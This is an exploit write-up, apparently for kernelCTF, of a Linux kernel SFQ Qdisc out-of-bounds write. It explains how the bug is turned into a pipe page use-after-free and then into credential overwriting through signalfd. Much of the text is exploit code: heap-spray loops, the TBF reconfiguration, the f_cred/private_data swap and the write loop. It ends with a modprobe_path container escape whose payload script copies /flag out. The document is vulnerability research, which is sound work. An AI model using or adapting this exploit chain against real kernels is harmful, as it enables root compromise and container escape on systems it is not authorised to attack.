# Attacking Objects

- Vulnerable object: SFQ Qdisc (`Qdisc` + `sfq_sched_data`)
- Attacking object: `pipe_inode_info`, `signalfd (files)`
- Primitive: Array Out-Of-Bounds to page-UAF corrupting `pipe_inode_info->files`

# TL;DR

- Spray `sfq_slots` in `kmalloc-64` to prevent an immediate kernel crash when the bug is triggered.
- Prevent a type-confused `skb` (it is a `sfq_slot`, see `vulnerability.md`) from being dequeued by reconfiguring the TBF Qdisc. Drop TBF rate and add packet overhead before the OOB write occurs.
- Use the `0x0000` written 262636 bytes OOB to corrupt the `pipe->files` field of a named pipe, free the pipe, cause page-level UAF and get arbitrary R/W in that page.
- Reclaim the freed page with signalfd files and use the page-level R/W primitive to swap `file->private_data` with `file->f_cred`.
- Get root by overwriting the process credentials with zeros via `signalfd4()`.

# Vulnerability Analysis

For the vulnerability analysis, please refer to `vulnerability.md`.

# Exploiting Pipe Inode Info Structures To Achieve Page-UAF

In this writeup, we turn a severely limited Array-Out-Of-Bounds write (a u16 value, 0x0000, written 262636 bytes out-of-bounds after the vulnerable SFQ Qdisc object) into privilege escalation corrupting a `pipe_inode_info` structure, setting its `pipe->files` field to zero to cause a page-UAF.

A `pipe_inode_info` structure is defined as follows:

```c {linenos=false}
struct pipe_inode_info {
	struct mutex               mutex;                /*     0    32 */
	wait_queue_head_t          rd_wait;              /*    32    24 */ [1]
	wait_queue_head_t          wr_wait;              /*    56    24 */
	unsigned int               head;                 /*    80     4 */
	unsigned int               tail;                 /*    84     4 */
	unsigned int               max_usage;            /*    88     4 */
	unsigned int               ring_size;            /*    92     4 */
	unsigned int               nr_accounted;         /*    96     4 */
	unsigned int               readers;              /*   100     4 */
	unsigned int               writers;              /*   104     4 */
	unsigned int               files;                /*   108     4 */ [2]
	unsigned int               r_counter;            /*   112     4 */
	unsigned int               w_counter;            /*   116     4 */
	bool                       poll_usage;           /*   120     1 */
	struct page *              tmp_page;             /*   128     8 */
	struct fasync_struct *     fasync_readers;       /*   136     8 */
	struct fasync_struct *     fasync_writers;       /*   144     8 */
	struct pipe_buffer *       bufs;                 /*   152     8 */
	struct user_struct *       user;                 /*   160     8 */

	/* size: 168, cachelines: 3, members: 19 */
	/* sum members: 161, holes: 1, sum holes: 7 */
	/* last cacheline: 40 bytes */
};
```

The vulnerable object, a SFQ Qdisc (`Qdisc` + `sfq_sched_data`), is allocated in `kmalloc-2k`. Each `kmalloc-2k` slab is allocated using one order 3 page.
`pipe_inode_info`, the target object, is allocated in a misaligned cache, `kmalloc-cg-192`. Slabs in this cache are allocated using order 0 pages.

Assuming we can achieve a perfect memory layout, by alternating slabs containing SFQ Qdiscs with slabs containing `pipe_inode_info` structures, we have a 50% chance of overwriting the `pipe->files` field (and not one of the `pipe->rd_wait` pointers) of one of the pipes, setting it to zero when the 0x0000 is written 262636 bytes out-of-bounds after the vulnerable SFQ Qdisc.

>If we logically segment memory into 4KB pages and only consider the offset within the page part of the 262636 OOB (`hex(262636 & 0xfff) = 0x1EC`), if the attacking SFQ Qdisc object is allocated at offset +0x00 in a 4KB page, the 0x0000 will corrupt the third object in the target kmalloc-cg-192 slab, specifically, the field at offset 108 within it (`pipe->files`). If the offset of the attacking object is +0x800, the fourteenth object will be corrupted, this time the field at offset 44 (`pipe->rd_wait`).
>
>      +0x00                +0x800               +0x1000
>        |                    |                    |
>            0x1EC                 0x9EC
>             |                     |
>         ____v_____________________v______________
>        |____________________|____________________|         <-- 2 kmalloc-2k objects
>         _________________________________________
>        |_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|         <-- kmalloc-cg-192 slab (21 objects)
>             ^                     ^  
>             |                     |
>      3rd obj, 108B offset      14th obj, 44B offset

The `pipe->files` field, is used as a reference counter to determine when a `pipe_inode_info` structure and all the associated objects need to be released.

This field can be incremented by opening a named pipe (created via [mkfifo()](https://www.man7.org/linux/man-pages/man3/mkfifo.3.html)) or alternatively, as reported by [Pumpkin](https://u1f383.github.io/), creating normal pipes using the `pipe()` syscall and then opening `/proc/self/fd/<n>`. In this exploit we will use named pipes.

When a named pipe is opened, [fifo_open()](https://elixir.bootlin.com/linux/v6.6.84/source/fs/pipe.c#L1102) is called. If `inode->i_pipe` is not present, a new `pipe_inode_info` object is allocated by [alloc_pipe_info()](https://elixir.bootlin.com/linux/v6.6.84/source/fs/pipe.c#L788) in `kmalloc-cg-192` and `pipe->files` incremented. If `inode->i_pipe` is already present, then only `pipe->files` is incremented:

```c {linenos=false}
static int fifo_open(struct inode *inode, struct file *filp)
{
	struct pipe_inode_info *pipe;
	bool is_pipe = inode->i_sb->s_magic == PIPEFS_MAGIC;
	int ret;

	filp->f_version = 0;

	spin_lock(&inode->i_lock);
	if (inode->i_pipe) {
		// inode->i_pipe already present, increment the pipe->files counter
		pipe = inode->i_pipe;
		pipe->files++; // [1]
		spin_unlock(&inode->i_lock);
	} else {
		// inode->i_pipe is not present, allocate a new pipe_inode_info object
		spin_unlock(&inode->i_lock);
		pipe = alloc_pipe_info(); // [2]
		if (!pipe)
			return -ENOMEM;
		pipe->files = 1;
		// ...
		inode->i_pipe = pipe;
		// ...
	}
	filp->private_data = pipe;

    // ...
}

struct pipe_inode_info *alloc_pipe_info(void)
{
	// ...
	// sizeof(struct pipe_inode_info) = 168. GFP_KERNEL_ACCOUNT is set
	// So it goes into kmalloc-cg-192
	pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);
	// ...
}
```

When the file descriptor of a named pipe is closed, [put_pipe_info()](https://elixir.bootlin.com/linux/v6.6.84/source/fs/pipe.c#L705) is called, and if `--pipe->files` is 0, the `pipe_inode_info` structure and all the associated objects are released:

```c {linenos=false}
static void put_pipe_info(struct inode *inode, struct pipe_inode_info *pipe)
{
	int kill = 0;

	spin_lock(&inode->i_lock);
	if (!--pipe->files) {
		inode->i_pipe = NULL;
		kill = 1;
	}
	spin_unlock(&inode->i_lock);

	if (kill)
		free_pipe_info(pipe);
}
```

Pipe deallocation is performed by [free_pipe_info()](https://elixir.bootlin.com/linux/v6.6.84/source/fs/pipe.c#L836). This function starts iterating through all the pipe buffers, and releases them by calling `pipe_buf_release()`, which internally calls `buff->ops->release()` ([anon_pipe_buf_release()](https://elixir.bootlin.com/linux/v6.6.84/source/fs/pipe.c#L125)).

The interesting part is that upon release, `free_pipe_info()` also frees the `pipe->tmp_page` if present. In our case, this would cause a page-UAF, as we would still have access to the freed pipe.

```c {linenos=false}
static void anon_pipe_buf_release(struct pipe_inode_info *pipe,
				  struct pipe_buffer *buf)
{
	struct page *page = buf->page;

	if (page_count(page) == 1 && !pipe->tmp_page)
		pipe->tmp_page = page;
	else
		put_page(page); // ***
}

void free_pipe_info(struct pipe_inode_info *pipe)
{
	unsigned int i;

	// ...

	for (i = 0; i < pipe->ring_size; i++) {
		struct pipe_buffer *buf = pipe->bufs + i;
		if (buf->ops)
			pipe_buf_release(pipe, buf);
	}

	// ...

	if (pipe->tmp_page)
		__free_page(pipe->tmp_page); // ***
	kfree(pipe->bufs);
	kfree(pipe);
}
```

# Exploit Analysis

>This exploit has been developed targeting a LTS kernel, while the same strategy works on multiple kernels, some things may change (e.g. the memory alignment of the `sfq_slot` structure).

>When I developed the original version of this exploit, I targeted a system with an open files hard limit of 1048576 files per process. This exploit requires a very large number of open files, and that value was more than sufficient to perform the attack with a single task. Unfortunately, when I tested the exploit on the kernelCTF systems, I realized the open files limit is very strict: `ulimit -Hn = 4096`. So, I decided to circumvent the limit by orchestrating multiple tasks, which, of course, makes the exploit more complex.

**@step(1): Initialization**

After initializing the sandbox environment and creating the files required to trigger modprobe, we set the "lo" network interface up, and then add a TBF qdisc.

TBF is configured with a low rate so packets will be dequeued after approximately one second (the time depends on the TBF configuration). This will give us enough time to trigger the vulnerability and reconfigure the qdisc before the OOB write occurs.

>We will need to reconfigure the qdisc to prevent a type-confused skb from being dequeued and thus avoid a kernel panic.

Next, we create two groups of tasks, each with a specific function:

- Tasks in group one perform the actual attack, spraying named pipes and attempting to gain root privileges. 
- Tasks in group two on the other hand are only used to spray signalfd files. 

We proceed to fill `kmalloc-2k` partial slabs (for SFQ Qdisc), `kmalloc-cg-192` (for `pipe_inode_info`), `kmalloc-cg-96` (for `pipe_buffer`, useful to mitigate noise), `kmalloc-64` (for `sfq_slot`) and then we initialize all the necessary dummy interfaces.

>We need to saturate kmalloc-64 with `sfq_slot` object due to a skb -> sfq_slot type confusion (see `vulnerability.md`).
>When the type-confusion occurs, the kernel immediately panics in `qdisc_bstats_update()` as this function calls `bstats_update() -> skb_is_gso(skb) -> skb_shinfo(skb)->gso_size`. 
>
>skb_is_gso() utilizes the macro `skb_shinfo()`, which uses `skb_end_pointer()`. This, in turn, relies on the `skb->head` pointer and `skb->end` of the `sk_buff` to determine where the packet data ends and the actual `skb_shared_info` begins.
>
>Now, `offsetof(struct sk_buff, head) = 192`, but in our case, the `"skb"` is a `sfq_slot`, which is allocated in `kmalloc-64`. Therefore, an access to `skb->head` at offset 192 translates to an access to the first qword of another object in kmalloc-64, specifically, the first qword of the third object after the type-confused `"skb"`. If this qword does not contain a valid pointer, the kernel crashes when the pointer is dereferenced to access `->gso_size`.
>
>By saturating the slab with sfq_slots, we can fake a `skb->head` pointer, which will correspond to the `slot->skblist_next` pointer of the third slot after the type-confused one. 

**@step(2): Drain pages and create partial slabs**

We proceed to drain pages from the PCP lists and buddy freelists. To achieve this, we use a well-known technique that allows for the allocation a large number of pages for a given order by relying on packet rings (more details can be found in [this Project Zero article](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html)). 

After pages have been drained, the next allocations will be served by splitting higher order pages, giving us access to relatively large portions of contiguous memory.

In this step we also create many partial slabs for `kmalloc-cg-96`, to mitigate noise when `alloc_pipe_inode()` is called, as after allocating `pipe_inode_info`, it also allocates a `pipe_buffer` structure.

**@step(3): Prepare the memory layout**

This part is the heart of the attack. For each iteration:
- If `i % SFQ_ALLOC_RATIO == 0`, we spray 128 SFQ Qdisc objects (or 8 `kmalloc-2k` slabs, equivalent to 8 order 3 pages).
- If `i % SFQ_ALLOC_RATIO != 0` we use `task_ctl()` to make the task `task_num` in the first task group spray 1344 `pipe_inode_info` (or 64 `kmalloc-cg-192` slabs, equivalent to 64 order 0 pages).

>By tweaking `SFQ_ALLOC_RATIO`, we can control how the 256KB blocks are filled. For example if `SFQ_ALLOC_RATIO = 2`, the exploit will attempt to fill one block with SFQ Qdiscs, followed by one block filld by `pipe_inode_info`. 
>
> `|   SFQ   |   PIPE   |   SFQ   |   PIPE   |   SFQ   |   PIPE   | ...`
>
>If `SFQ_ALLOC_RATIO = 3`, it will fill one block with SFQ Qdiscs, followed by two blocks filled with `pipe_inode_info` structures, and so on.
>
> `|   SFQ   |   PIPE   |   PIPE   |   SFQ   |   PIPE   |   PIPE   | ...`
>

```c
// ------------------------ [ main ] --------------------------

for (int i = 0; i < NUM_256KB_BLOCKS; i++) {
	if (i % SFQ_ALLOC_RATIO == 0) {
		// Attempt to fill 8 order 3 pages with 128 kmalloc-2k objects (sfq qdisc)
		for (int j = sfq_num; j < sfq_num + NUM_KMALLOC_2K_OBJECTS; j++) {
			snprintf(if_name, sizeof(if_name), "dummy-%d", j + NUM_PREALLOC_SFQ);
			tc(ADD_QDISC, "sfq", if_name, TC_H(1, 0), TC_H_ROOT, NULL, 0);

			// Allocate vuln object
			if (j == VULN_OBJ_ALLOCATION_IDX) {
				printf("vuln obj alloc idx %d\n", j);
				tc(ADD_QDISC, "sfq", "lo", TC_H(2, 0), TC_H(1, 0), NULL, 0);
			}
		}
		sfq_num += NUM_KMALLOC_2K_OBJECTS;
	} else {
		// Attempt to fill 8 order 3 pages with 0x540 kmalloc-192 objects (64 order 0 pages)
		task_ctl(tasks.group_1[task_num++], TASK_OPEN_FIFO);
	}
}

// -------------------- [ Tasks in group 1 ] ---------------------

// Spray pipe_inode_info
for (int i = 0; i < NUM_FIFO; i++)
	fifo_fd_A[i] = open_fifo(fifo_path[i]);
```

>Please note that the memory layout described above can only be theoretically achieved. In reality, many variables cannot be controlled.
>
>For instance, when `alloc_pipe_info()` is called, `pipe_inode_info` is not the only structure being allocated, there are also `pipe_buffer` and other structures (inodes etc.). The same is true for the SFQ Qdisc: after the qdisc, other objects are allocated as well.
>
>While we can try to mitigate the noise, (e.g. by creating many partial slabs for the "unwanted" objects, before spraying the target structure) achieving that perfect layout to improve the exploit stability can be very difficult. However, this remains a good starting point.
>

**@step(4): Trigger the vulnerability and drop TBF rate to block dequeue**

The memory layout setup is complete. Now we send packets to the `lo` network interface to trigger the vulnerability. Before the Qdisc watchdog timer fires and the OOB write occurs, we reconfigure the TBF Qdisc of the interface by dropping the TBF rate and adding packet overhead. 

This, will prevent a type-confused `"skb"` (the kernel thinks it is a `skb`, but it is a `sfq_slot`, see `vulnerability.md`) from being dequeued (well, it will be dequeued, but after 18 hours...), saving us from an immediate kernel crash.

Now, we just need to wait approximately 1 second, until the Qdisc watchdog timer fires and the OOB write is triggered. If we are lucky, the `0x0000` written out-of-bounds will corrupt the `pipe->files` field of one of the named pipes, setting it to zero: 

```c
send_packets("lo", 64, 3, NO_PRIO);

tbf_custom_opt.burst = 99;
tbf_custom_opt.rate64 = 1;
tbf_custom_opt.overhead = 0xffff;
tc(ADD_QDISC, "tbf", "lo", TC_H(1, 0), TC_H_ROOT, &tbf_custom_opt, /*change=*/1);

puts("waiting for oob");
sleep(1); // Wait for the malicious packet to be dequeued, tbf latency is ~1s
```

**@step(5): Re-open all named pipes**

From now on, the role of the main function is to control tasks in a given group utilizing the `for_each_task()` macro and `task_ctl()`.

We start by opening all the named pipes once again, so for all the pipes, `pipe->files = 2`, and for the corrupted pipe `pipe->files = 1`. 

For each pipe, we also ensure to write a certain amount of data. This [will trigger a page allocation](https://elixir.bootlin.com/linux/v6.6.84/source/fs/pipe.c#L502) in `pipe_write()`, and a page pointer to be stored in `pipe->tmp_page`:

>Note that after writing, we need to read the same abount of data from the pipe. We need to make sure `pipe->tail` and `pipe->head` are equal, so when the pipe is freed and the `pipe->bufs[i]->ops` pointers are nulled out by `pipe_buf_release()`, we don't trigger a null-ptr-deref when we attempt to read data from the pipe and [pipe_buf_confirm()](https://elixir.bootlin.com/linux/v6.6.84/source/fs/pipe.c#L300) is called.

```c
// ------------------------ [ main ] --------------------------

for_each_task(tasks.group_1, tsk)
	task_ctl(tsk, TASK_REOPEN_FIFO);

// -------------------- [ Tasks in group 1 ] ---------------------

for (int i = 0; i < NUM_FIFO; i++) {
	fifo_fd_B[i] = open_fifo(fifo_path[i]); // pipe->files++
	write(fifo_fd_B[i], buff, 0x800); // pipe->head -> 1
	read(fifo_fd_B[i], buff, 0x800); // pipe->tail -> 1
}
```

**@step(6): Close all named pipes**

Now we close all the pipes. This will decrement the `pipe->files` counter of the victim pipe to zero, leading to the release of `pipe->tmp_page` along with the pipe itself.

This results in a UAF condition, as we still hold a reference to the corrupted named pipe file descriptor in the `fifo_fd_A[]` array (opened in step 3):

>In this step we also write `PAGE_SIZE (4096)` bytes to the page (in the case of the victim pipe we actually write to a free page). This will allows us to read the page of memory later after spraying signalfd files.

```c
// ------------------------ [ main ] --------------------------

for_each_task(tasks.group_1, tsk)
	task_ctl(tsk, TASK_CAUSE_UAF);

// -------------------- [ Tasks in group 1 ] ---------------------

for (int i = 0; i < NUM_FIFO; i++) {
	close(fifo_fd_B[i]);
	write(fifo_fd_A[i], buff, PAGE_SIZE);
}
```

**@step(7): Spray signalfd files**

We are ready to spray signalfd files. The free page is reclaimed by one of the `filp` slabs:

```c
// ------------------------ [ main ] --------------------------

for_each_task(tasks.group_2, tsk)
	task_ctl(tsk, TASK_ALLOC_SIGNALFD);

// -------------------- [ Tasks in group 2 ] ---------------------

for (int i = 0; i < NUM_SIGNALFD_FILES; i++)
	sig_fd[i] = alloc_signalfd(-1);
```

**@step(8): Locate the corrupted pipe**

Now, we need to locate the corrupted pipe. Since our original buffer consisted of 4096 zeros, if `memchr(buff, 0xFF, PAGE_SIZE)` returns a non-null value, it indicates that we have found the pipe:

```c
// ------------------------ [ main ] --------------------------

for_each_task(tasks.group_1, tsk)
	task_ctl(tsk, TASK_FIND_FIFO);

// -------------------- [ Tasks in group 1 ] ---------------------

for (int i = 0; i < NUM_FIFO; i++) {
	read(fifo_fd_A[i], buff, PAGE_SIZE);
	if (memchr(buff, 0xFF, PAGE_SIZE) != NULL) {
		evil_fifo = fifo_fd_A[i];
		break;
	}
}
```

**@step(9): Free some signalfd files**

Once the corrupted pipe is identified, we free some signalfd files from task group 2. We will reallocate them in the task that controls the corrupted pipe.

>This is not strictly necessary, but very useful to avoid some annoying IPC between the task that controls the victim pipe, and the tasks that managed to reclaim the victim page with files.

```c
// ------------------------ [ main ] --------------------------

for_each_task(tasks.group_2, tsk)
	task_ctl(tsk, TASK_FREE_SIGNALFD);

// -------------------- [ Tasks in group 2 ] ---------------------

for (int i = 0; i < NUM_SIGNALFD_FILES; i++)
	if (i % 8 == 0)
		close(sig_fd[i]);
```

**@step(10): Get root**

This is the last step. We first reallocate some signalfd files from the task that controls the corrupted pipe:

```c
// ------------------------ [ main ] --------------------------

for_each_task(tasks.group_1, tsk)
	task_ctl(tsk, TASK_GET_ROOT);

// -------------------- [ Tasks in group 1 ] ---------------------

if (memcmp(old_page, buff, PAGE_SIZE)) {

	printf("identified in task %d\n", getpid());

	for (int i = 0; i < NUM_SIGNALFD_FILES; i++)
		sig_fd[i] = alloc_signalfd(-1);
```

Then we perform instance fingerprinting by examining the offset `0x70` of the first file in the slab. For LTS, this offset corresponds to `file->f_cred`, while for COS, it is `NULL`:

```c
uint64_t cred_offset = FILE_CRED_OFFSET_LTS;
if (!page[FILE_CRED_OFFSET_LTS/sizeof(uint64_t)])
	cred_offset = FILE_CRED_OFFSET_COS;
```

Using the page-level R/W primitive, we swap the `file->private_data` pointer with `file->f_cred` for all the file in the slab. This gives us a qword write primitive when [do_signalfd4()](https://elixir.bootlin.com/linux/v6.6.90/source/fs/signalfd.c#L292) is called:

```c
static int do_signalfd4(int ufd, sigset_t *mask, int flags)
{
	struct signalfd_ctx *ctx;

	// ...

	if (flags & ~(SFD_CLOEXEC | SFD_NONBLOCK))
		return -EINVAL;

	sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));
	signotset(mask);

	if (ufd == -1) {
		struct file *file;

		ctx = kmalloc(sizeof(*ctx), GFP_KERNEL);
		if (!ctx)
			return -ENOMEM;

		ctx->sigmask = *mask;

		// ...
		file = anon_inode_getfile("[signalfd]", &signalfd_fops, ctx,
				       O_RDWR | (flags & O_NONBLOCK));
		// ...
	} else {
		// ...
		// We swapped file->private_data with file->f_cred
		// So here ctx = file->f_cred
		ctx = fd_file(f)->private_data; 
		// ...
		ctx->sigmask = *mask; // Overwrite f_cred
		// ...
	}

	return ufd;
}
```

We use this write primitive to set the process credentials to zero. Since we cannot control the lower bytes of the signalfd mask, we write backwards, starting from `cred + 48`, utilizing the upper bytes of the mask, which are set to zero.

```c
uint64_t num_writes = 48 / sizeof(uint16_t) + 1;
uint64_t file_chunk_size = 0x100;
uint64_t num_files_per_page = PAGE_SIZE / file_chunk_size; // 16

for (int i = 0; i < num_writes; i++) {
	for (int j = 0; j < num_files_per_page; j++) {
		uint64_t file_object_offset = file_chunk_size * j / sizeof(uint64_t);
		uint64_t file_cred_offset = cred_offset / sizeof(uint64_t);
		uint64_t file_private_data_offset = FILE_PRIVATE_DATA_OFFSET / sizeof(uint64_t);

		// file->private_data = file->f_cred
		cred = page[file_object_offset +  file_cred_offset];
		page[file_object_offset + file_private_data_offset] = cred + 48 - i * sizeof(uint16_t);

		// Overwrite the entire page with the malicious one
		write(evil_fifo, buff, PAGE_SIZE);
		// Read the page to reset pipe buffer len to 0 and reuse the same page
		read(evil_fifo, buff, PAGE_SIZE);

		// Arb write
		for (int k = 0; k < NUM_SIGNALFD_FILES; k++)
			alloc_signalfd(sig_fd[k]);
	}
}
```

At this point we are root! To escape from the container we modify `/proc/sys/kernel/modprobe`. 

Since we don't know the PID of the current process in the root namespace, we bruteforce it. For each iteration, we set the modprobe path to `"/proc/<i>/root/tmp/evil"`, and trigger modprobe. When the attacking task PID is found, the kernel will execute our malicious payload, and the flag will be copied to the memfd file descriptor of the task:

```c
#define MODPROBE_PAYLOAD \
    "#!/bin/bash\n" \
    "pid=$(echo \"$0\" | sed -E 's|/proc/([0-9]+)/.*|\\1|')\n" \
    "cat /flag > /proc/$pid/fd/696\n"

// ...

int modeprobe_exec(void) {
	// ...
	for (int pid = MODPROBE_MIN_PID; pid < MODPROBE_MAX_PID; pid++) {
        snprintf(evil_path, sizeof(evil_path), "/proc/%d/root/tmp/evil", pid);
        write_file(MODPROBE_PATH, evil_path, strlen(evil_path));

        execve("/tmp/trigger", NULL, NULL);
        fstat(696, &st);

        if (st.st_size > 0) {
            puts("pwned");
            read(696, flag, st.st_size);
            printf("%s\n", flag);
            sleep(1);
            exit(0);
        }
    }
    return 0;
}
```

## Additional Notes

With the original version of this exploit (the one with a single task), I was able to get root privileges about 30% of the times without crashing the kernel. My tests were performed using a LTS kernel and a higher number of retries. Here are some insights that can be used to improve stability.

The most common crash caused by the exploit occurs when the `pipe->rd_wait` waitlist is corrupted by the `0x0000` instead of `pipe->files`.

If this list is corrupted, a general protection fault is triggered by `wake_up_interruptible_sync_poll()` when [pipe_write() is used to write data to the empty pipe](https://elixir.bootlin.com/linux/v6.6.84/source/fs/pipe.c#L575) or [pipe_read() is used to read data from the pipe without emptying it](https://elixir.bootlin.com/linux/v6.6.84/source/fs/pipe.c#L393). 

Notice how the infamous `0x0000` corrupted one of the `pipe->rd_wait` pointers:

```txt
[   44.490678] general protection fault, probably for non-canonical address 0xffff00008f2fa9e8: 0000 [#1] PREEMPT SMP PTI
[   44.492224] CPU: 0 PID: 392 Comm: exp Not tainted 6.6.84 #1
[   44.493043] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   44.494427] RIP: 0010:__wake_up_common+0x4c/0x180
[   44.495162] Code: 24 0c 89 4c 24 08 4d 85 c9 74 0a 41 f6 01 04 0f 85 a3 00 00 00 48 8b 43 08 4c 8d 40 ...
...
[   44.507085] Call Trace:
[   44.507434]  <TASK>
[   44.507735]  ? die_addr+0x32/0x80
[   44.508189]  ? exc_general_protection+0x14c/0x3c0
[   44.508808]  ? try_charge_memcg+0x3ae/0x8b0
[   44.509385]  ? asm_exc_general_protection+0x22/0x30
[   44.510054]  ? __wake_up_common+0x4c/0x180
[   44.510533]  ? _copy_from_iter+0x57/0x500
[   44.511025]  __wake_up_common_lock+0x82/0xd0
[   44.511631]  pipe_write+0x372/0x720
[   44.512135]  ? apparmor_file_permission+0x82/0x180
[   44.512807]  vfs_write+0x393/0x440
[   44.513264]  ksys_write+0xb7/0xf0
[   44.513680]  do_syscall_64+0x5e/0x90
```

Two theoretically possible side channels to identify the corrupted pipe without relying on `pipe_read()` and `pipe_write()` are:

- Using [pipe_ioctl()](https://elixir.bootlin.com/linux/v6.6.84/source/fs/pipe.c#L613):
when the pipe is freed and the UAF condition occurs, `free_pipe_info()` will also free `pipe->bufs`. This will cause the slab obfuscated freelist pointer to overlap with `len` and `offset` of one of the pipe buffers. Since we still have access to this pipe, `pipe_ioctl()` can be utilized to retrieve the number of bytes present in the pipe. If this size is very large, it indicates that we have found the corrupted pipe.

- Opening the pipes as write-only, so `pipe->readers = 0` for all the pipes: when `free_inode_info()` frees the pipe, the slab obfuscated freelist pointer overlaps with `pipe->nr_accounted` and `pipe->readers` of `pipe_inode_info`, resulting in a very large `pipe->readers` value. By default, an attempt to write to a write-only pipe without any active readers, results in a `SIGPIPE` (which can be handled in user-space using `sigaction()`) at the [very beginning of pipe_write()](https://elixir.bootlin.com/linux/v6.6.84/source/fs/pipe.c#L446). This means that if we write to all the pipes, we can identify the corrupted one when `SIGPIPE` is _not_ received.
